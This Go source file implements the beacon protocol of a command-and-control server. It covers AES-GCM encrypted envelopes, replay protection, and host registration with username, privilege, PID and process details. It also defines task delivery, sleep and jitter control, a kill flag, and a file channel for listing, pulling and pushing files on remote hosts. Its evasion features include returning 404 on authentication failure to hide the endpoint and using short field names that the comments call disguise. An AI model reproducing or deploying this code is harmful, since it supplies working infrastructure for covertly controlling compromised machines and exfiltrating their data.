package c2center

// beacon 通信协议(契约 C2_CONTRACTS.md §3,冻结):
//   - 传输:Content-Type application/octet-stream,body = base64( AES-256-GCM( json ) ),
//     密文线格式 = nonce(12B) || ciphertext+tag;
//   - 信封 JSON 字段刻意短(t/sid/ts/nc/d;meta.sl/jt/kl)——省字节也是伪装;
//   - 安全:ts 偏移 ±10min;nc 按 sid(reg 用 uid)做 LRU(1024)去重防重放;
//     密钥/重放/时间窗错误一律 ErrAuth → 监听器映射 404,不暴露端点存在性。

import (
	"container/list"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"sync"
	"time"
)

// keySize 是 AES-256 密钥长度。
const keySize = 32

// timestampWindow 是请求 ts 与服务器时钟的允许偏移。
const timestampWindow = 10 * time.Minute

// nonceCapacity 是单会话 nc 去重容量(LRU)。
const nonceCapacity = 1024

// 信封类型(请求 t 与响应 t)。
const (
	TypeReg   = "reg"
	TypePoll  = "poll"
	TypeRes   = "res"
	TypeFile  = "file"
	TypeAck   = "ack"
	TypeTasks = "tasks"
)

// ErrAuth 是「密钥不匹配/密文损坏/重放/时间窗越界」的统一错误:监听器把它映射成
// 404,让探测端点的攻击者无法区分「路径不存在」与「密钥错误」。
var ErrAuth = errors.New("c2: 认证失败(密钥/重放/时间窗)")

// Seal 用 AES-256-GCM 加密,返回 nonce(12B) || ciphertext+tag 的线格式。
func Seal(key, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("c2: 生成 nonce 失败: %w", err)
	}
	// dst=nonce:Seal 把密文追加在 nonce 之后,恰好拼出线格式。
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// Open 解开 Seal 的输出。密钥错误/密文损坏一律返回包装 ErrAuth 的错误(调用方映射 404)。
func Open(key, sealed []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(sealed) < gcm.NonceSize() {
		return nil, fmt.Errorf("%w: 密文过短", ErrAuth)
	}
	plain, err := gcm.Open(nil, sealed[:gcm.NonceSize()], sealed[gcm.NonceSize():], nil)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrAuth, err)
	}
	return plain, nil
}

// newGCM 校验密钥长度并构造 AEAD。
func newGCM(key []byte) (cipher.AEAD, error) {
	if len(key) != keySize {
		return nil, fmt.Errorf("c2: 密钥长度 %d 字节,需 %d", len(key), keySize)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// BeaconUID 计算 beacon 身份指纹:sha256(listenerID|hostname|username|os) 前 16 hex。
// reg 载荷里的 uid 即此值;平台按 listener_id+beacon_uid 幂等复活会话。四种载荷格式
// 的模板与测试共用本函数,保证口径一致。
func BeaconUID(listenerID int64, hostname, username, osName string) string {
	sum := sha256.Sum256([]byte(fmt.Sprintf("%d|%s|%s|%s", listenerID, hostname, username, osName)))
	return hex.EncodeToString(sum[:])[:16]
}

// freshTS 校验请求时间戳落在 ±timestampWindow 内。
func freshTS(ts int64, now time.Time) bool {
	if ts <= 0 {
		return false
	}
	diff := now.Unix() - ts
	if diff < 0 {
		diff = -diff
	}
	return diff <= int64(timestampWindow/time.Second)
}

// nonceTable 按 key(会话 sid,reg 时用 uid)维护已见 nc 的 LRU 集合。
type nonceTable struct {
	mu sync.Mutex
	m  map[string]*lruSet
}

func newNonceTable() *nonceTable {
	return &nonceTable{m: map[string]*lruSet{}}
}

// seen 记录一次 nc;返回 false 表示 nc 已出现过(重放)。
func (nt *nonceTable) seen(key, nc string) bool {
	nt.mu.Lock()
	defer nt.mu.Unlock()
	set, ok := nt.m[key]
	if !ok {
		set = newLRUSet(nonceCapacity)
		nt.m[key] = set
	}
	return set.add(nc)
}

// lruSet 是固定容量的 LRU 字符串集合(add 返回 false = 已存在)。
type lruSet struct {
	capacity int
	ll       *list.List // front = 最新
	m        map[string]*list.Element
}

func newLRUSet(capacity int) *lruSet {
	return &lruSet{capacity: capacity, ll: list.New(), m: map[string]*list.Element{}}
}

func (s *lruSet) add(v string) bool {
	if el, ok := s.m[v]; ok {
		s.ll.MoveToFront(el)
		return false
	}
	if s.capacity > 0 && s.ll.Len() >= s.capacity {
		if back := s.ll.Back(); back != nil {
			s.ll.Remove(back)
			delete(s.m, back.Value.(string))
		}
	}
	s.m[v] = s.ll.PushFront(v)
	return true
}

// ---- 信封(字段名冻结,勿改)----

// RequestEnvelope 是 beacon→平台的请求信封。
type RequestEnvelope struct {
	Type string          `json:"t"`
	SID  string          `json:"sid,omitempty"` // reg 时省略
	TS   int64           `json:"ts"`            // unix 秒
	NC   string          `json:"nc"`            // 随机 UUID,防重放
	Data json.RawMessage `json:"d,omitempty"`
}

// ResponseEnvelope 是平台→beacon 的响应信封。meta 每个响应都带,由会话行派生。
type ResponseEnvelope struct {
	Type string   `json:"t"`
	Meta RespMeta `json:"meta"`
	Data any      `json:"d,omitempty"`
}

// RespMeta 由会话行派生:sl/jt 取 sleep_sec/jitter_pct,kl=(status=="dead")。
// 终止会话 = 置 dead,beacon 下次心跳看到 kl 自行退出,无独立 kill 信令。
type RespMeta struct {
	SleepSec  int  `json:"sl"`
	JitterPct int  `json:"jt"`
	Kill      bool `json:"kl"`
}

// metaFromSession 从会话行派生响应 meta;会话缺失时回落默认休眠(与库默认一致)。
func metaFromSession(sess *Session) RespMeta {
	if sess == nil {
		return RespMeta{SleepSec: defaultSleepSec, JitterPct: defaultJitterPct}
	}
	sleep := sess.SleepSec
	if sleep <= 0 {
		sleep = defaultSleepSec
	}
	jitter := sess.JitterPct
	if jitter < 0 {
		jitter = 0
	}
	return RespMeta{SleepSec: sleep, JitterPct: jitter, Kill: sess.Status == StatusDead}
}

// ---- 请求载荷(t 的 d)----

// RegPayload 是 t=reg 的 d:beacon 自报主机档案。
type RegPayload struct {
	UID      string `json:"uid"` // sha256(listenerID|hostname|username|os) 前 16 hex
	Hostname string `json:"hn"`
	Username string `json:"us"`
	Elevated bool   `json:"el"`
	OS       string `json:"os"`
	Arch     string `json:"ar"`
	IP       string `json:"ip"`
	PID      int    `json:"pi"`
	Process  string `json:"pr"`
}

// ResPayload 是 t=res 的 d:任务结果,可与 poll 合并(有结果带结果,顺便拉新任务)。
type ResPayload struct {
	Results []ResResult `json:"rs"`
}

// ResResult 是单条任务结果。Status ∈ done|error;Output 为 base64(json []byte 自动
// std b64);ErrText 是错误文本。
type ResResult struct {
	TaskID  int64  `json:"id"`
	Status  string `json:"st"`
	Output  []byte `json:"o,omitempty"`
	ErrText string `json:"e,omitempty"`
}

// FilePayload 是 t=file 的 d:文件通道动作。
//   - ls:beacon 上报目录条目,Entries 原样透传回响应(平台同时把它记为 files_list
//     任务的输出,任务在收到 ls 时收尾);
//   - pull:beacon 拉平台 blob 分片(upload,uploads/ 只读);
//   - push:beacon 推远端文件分片(download,downloads/ 只写;首片可带 ln=总大小,平台忽略)。
type FilePayload struct {
	Action     string          `json:"a"` // ls|pull|push
	TransferID int64           `json:"tf"`
	Path       string          `json:"p,omitempty"`
	Offset     int64           `json:"of,omitempty"`
	Length     int64           `json:"ln,omitempty"`
	Data       []byte          `json:"b,omitempty"` // b64
	EOF        bool            `json:"eof,omitempty"`
	Entries    json.RawMessage `json:"es,omitempty"` // ls:目录条目 JSON 直通
}

// ---- 响应载荷(t 的 d)----

// AckPayload 是 t=ack 的 d(reg 响应),beacon 靠它拿到 sid。
type AckPayload struct {
	SID string `json:"sid"`
}

// TaskOut 是下发给 beacon 的单条任务。
type TaskOut struct {
	ID    int64  `json:"id"`
	Kind  string `json:"kind"`
	Input string `json:"input"`
}

// TasksPayload 是 t=tasks 的 d。Tasks 永不为 nil(空队列也是 [],Go nil→JSON null
// 会打崩前端,契约硬约束)。
type TasksPayload struct {
	Tasks []TaskOut `json:"ts"`
}

// LsEntry 是目录条目:n=名称 s=大小 d=是否目录 m=修改时间 unix 秒。
type LsEntry struct {
	Name    string `json:"n"`
	Size    int64  `json:"s"`
	IsDir   bool   `json:"d"`
	ModTime int64  `json:"m"`
}

// LsPayload 是 t=file(ls) 的 d(typed 版;监听器响应用 RawMessage 对请求里的
// entries 做字节级直通,本结构供测试/工具构造)。Entries 永不为 nil。
type LsPayload struct {
	Entries []LsEntry `json:"es"`
}

// PullPayload 是 t=file(pull) 的 d:eof 恒出现(beacon 靠它判断收尾)。
type PullPayload struct {
	Data []byte `json:"b,omitempty"`
	EOF  bool   `json:"eof"`
}

// PushPayload 是 t=file(push) 的 d:确认空对象。
type PushPayload struct{}
